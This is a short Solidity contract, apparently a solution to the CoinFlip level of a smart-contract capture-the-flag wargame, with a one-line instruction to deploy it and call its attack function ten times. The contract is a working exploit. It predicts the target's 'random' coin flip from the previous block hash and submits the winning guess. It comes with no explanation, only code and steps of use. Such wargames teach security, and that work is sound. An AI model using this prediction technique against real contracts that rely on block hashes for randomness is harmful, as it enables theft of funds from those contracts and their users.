```javascript
pragma solidity ^0.6.0;

contract CoinFlipAttack {
  event AttackStatus(bool is_successful);

  function attack(address attack_address) public {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    (bool success , bytes memory data) = attack_address.call{ gas : 2000000 }(abi.encodeWithSignature("flip(bool)", side));
    require(success, "Failed to flip coin.");
    bool result = abi.decode(data, (bool));
    emit AttackStatus(result);
  }
}
```

Deploy the above contract and call attack 10 times on the level's contract address.